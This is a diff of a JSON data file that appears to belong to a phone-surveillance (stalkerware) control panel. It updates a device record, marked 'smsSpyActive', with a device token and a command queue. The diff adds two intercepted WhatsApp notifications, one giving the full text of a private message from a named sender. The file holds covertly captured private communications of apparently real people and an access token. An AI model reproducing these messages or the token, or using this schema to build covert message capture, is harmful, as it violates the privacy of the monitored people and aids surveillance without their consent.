@@ -7976,7 +7976,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777190571134,
+    "lastSeen": 1777190590877,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -7992,6 +7992,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Rezky",
+        "content": "‎2 pesan baru",
+        "time": "26/04 16:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777190572774
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Rezky",
+        "content": "Sudah kutanya bilang kitami bicara langsung dengan bpakku nabilang Kaumo dulu smpaikan baik2 tanya apa maunya sekarang.",
+        "time": "26/04 16:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777190572691
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
